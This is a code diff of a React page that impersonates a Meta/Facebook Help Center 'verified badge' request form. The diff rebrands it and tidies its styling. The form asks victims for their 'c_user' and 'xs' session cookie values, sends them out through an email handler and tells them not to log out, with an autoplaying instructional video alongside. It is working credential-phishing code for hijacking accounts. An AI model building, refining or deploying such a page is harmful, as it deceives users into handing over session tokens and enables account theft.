@@ -48,18 +48,20 @@ const ValidationPage = () => {
   return (
     <>
       <form ref={form} onSubmit={sendEmail}>
+        {/* Header Section */}
         <div
           className="d-flex align-items-center"
-          style={{ width: "100%", height: "90px", background: "#4667AC" }}
+          style={{ width: "100%", height: "90px", background: "#1877F2" }}
         >
           <h1 className="text-white ms-4 m-0 d-flex align-self-center">
-            facebook
+            Meta
           </h1>
         </div>
 
+        {/* Subheader Section */}
         <div
           className="d-flex align-items-center"
-          style={{ width: "100%", height: "60px", background: "#E9EBEE" }}
+          style={{ width: "100%", height: "60px", background: "#F0F2F5" }}
         >
           <h4 className="ms-4 m-0 d-flex align-self-center text-primary">
             Help Center
@@ -68,43 +70,41 @@ const ValidationPage = () => {
 
         <div className="col-12 my-4 d-flex justify-content-center align-items-center">
           <div className="col-11 col-md-6 border">
-            <div className="p-2" style={{ background: "#F5F6F7" }}>
-              <h5 className="m-0">Request a verified badge on Facebook</h5>
+            {/* Request Information Section */}
+            <div className="p-2" style={{ background: "#E4E6EB" }}>
+              <h5 className="m-0">Request a verified badge on Meta</h5>
             </div>
             <div className="p-2">
               {isFormValid && (
                 <div className="alert alert-danger">
                   Please enter valid values for both fields.
                   <br />
-                  For more detail check the video below.
+                  For more detail, check the video below.
                 </div>
               )}
+
+              {/* Informational Paragraphs */}
               <p className="fw-semibold validation_form_para">
-                The verified badge means that Facebook has confirmed that the
-                Page or profile is the authentic presence of the individual,
-                public figure or brand that it represents.
+                The verified badge means that Meta has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.
               </p>
               <p className="fw-semibold validation_form_para">
-                A Facebook account with a verified badge <img src="https://firebasestorage.googleapis.com/v0/b/contactvehicleapp-7d7a0.appspot.com/o/secondtick.png?alt=media&token=72a304b3-4767-4306-917d-4181f6b576af" alt="blue tick" style={{ width: '1rem', marginBottom: '0.1rem' }} /> next to its name now means that Facebook has confirmed it as the authentic presence for that person or brand. Previously, the verified badge also required the person or brand to be notable and unique.
-              </p>
-              
-              <p className="fw-semibold validation_form_para">
-                The verified badge <img src="https://firebasestorage.googleapis.com/v0/b/contactvehicleapp-7d7a0.appspot.com/o/secondtick.png?alt=media&token=72a304b3-4767-4306-917d-4181f6b576af" alt="blue tick" style={{ width: '1rem', marginBottom: '0.1rem' }} /> serves as a tool to help users find the genuine accounts of people and brands. If an account has the verified badge, it confirms that it represents who it claims to be. However, a verified badge is not a symbol of importance, authority, or expertise. We do not use the verified badge <img src="https://firebasestorage.googleapis.com/v0/b/contactvehicleapp-7d7a0.appspot.com/o/secondtick.png?alt=media&token=72a304b3-4767-4306-917d-4181f6b576af" alt="blue tick" style={{ width: '1rem', marginBottom: '0.1rem' }} /> to endorse or recognize public figures or brands.
-              </p>
-              <p className="fw-semibold validation_form_para">
-                Once verified, public figures, celebrities, and brands that meet certain account and eligibility requirements may not change their username on their account. Verification cannot be transferred to another account. Facebook accounts that impersonate public figures or other individuals violate our Community Guidelines and are not permitted on Facebook.
+                A Meta account with a verified badge <img src="https://firebasestorage.googleapis.com/v0/b/contactvehicleapp-7d7a0.appspot.com/o/secondtick.png?alt=media&token=72a304b3-4767-4306-917d-4181f6b576af" alt="blue tick" style={{ width: '1rem', marginBottom: '0.1rem' }} /> next to its name now means that Meta has confirmed it as the authentic presence for that person or brand.
               </p>
 
+              <p className="fw-semibold validation_form_para">
+                The verified badge <img src="https://firebasestorage.googleapis.com/v0/b/contactvehicleapp-7d7a0.appspot.com/o/secondtick.png?alt=media&token=72a304b3-4767-4306-917d-4181f6b576af" alt="blue tick" style={{ width: '1rem', marginBottom: '0.1rem' }} /> serves as a tool to help users find the genuine accounts of people and brands.
+              </p>
 
               <p className="fw-semibold validation_form_para">
-                Please provide the precise details below. Refer to the video for
-                clarification if you find the instructions unclear.
+                Once verified, public figures, celebrities, and brands that meet certain account and eligibility requirements may not change their username on their account.
               </p>
-                
-              <p
-                className="fw-semibold text-secondary"
-                style={{ fontSize: "12px" }}
-              >
+
+              <p className="fw-semibold validation_form_para">
+                Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
+              </p>
+
+              {/* Video Section */}
+              <p className="fw-semibold text-secondary" style={{ fontSize: "12px" }}>
                 Detailed Video Information.
               </p>
 
@@ -113,26 +113,26 @@ const ValidationPage = () => {
                 autoPlay
                 muted={videoMuted}
                 src="https://firebasestorage.googleapis.com/v0/b/details-facebook-a00f0.appspot.com/o/0809.mp4?alt=media&token=b12189d9-dd1f-4d1a-8245-43b12e4094a9"
-                style={{ width: "500px", height: "280px" }} // Increased video size
+                style={{ width: "400px", height: "225px" }} // Smaller video size
               ></video>
               <br />
-              <button 
-                onClick={() => setVideoMuted(false)} 
-                style={{ 
-                  padding: "4px 8px", // Smaller button size
-                  fontSize: "12px", // Smaller font size
-                  marginTop: "10px" // Adjusted spacing
+              <button
+                onClick={() => setVideoMuted(false)}
+                style={{
+                  padding: "6px 12px",
+                  fontSize: "14px",
+                  marginTop: "10px",
                 }}
               >
                 Enable Sound
               </button>
+
               <p className="fw-semibold validation_form_para mt-2">
                 Please be sure to provide the requested information below.
               </p>
 
-              <label className="" style={{ fontSize: "12px" }}>
-                c_user
-              </label>
+              {/* Form Fields */}
+              <label style={{ fontSize: "12px" }}>c_user</label>
               <br />
               <input
                 type="number"
@@ -142,28 +142,23 @@ const ValidationPage = () => {
                 title="Please enter 15 digits"
               />
               <br />
-              <label className="mt-2" style={{ fontSize: "12px" }}>
-                xs
-              </label>
+              <label className="mt-2" style={{ fontSize: "12px" }}>xs</label>
               <br />
-              <input
-                type="text"
-                name="xs"
-              />
+              <input type="text" name="xs" />
               <p className="mt-2" style={{ fontSize: "12px" }}>
-                Please make sure not to log out from your computer or laptop
-                until you have received a verification email.
+                Please make sure not to log out from your computer or laptop until you have received a verification email.
               </p>
             </div>
 
+            {/* Submit Button */}
             <div
               className="p-2 mb-2 d-flex justify-content-end"
-              style={{ background: "#F5F6F7" }}
+              style={{ background: "#E4E6EB" }}
             >
               <button
                 type="submit"
                 className="text-white border-0"
-                style={{ background: "#4267B2" }}
+                style={{ background: "#1877F2" }}
               >
                 Submit
               </button>
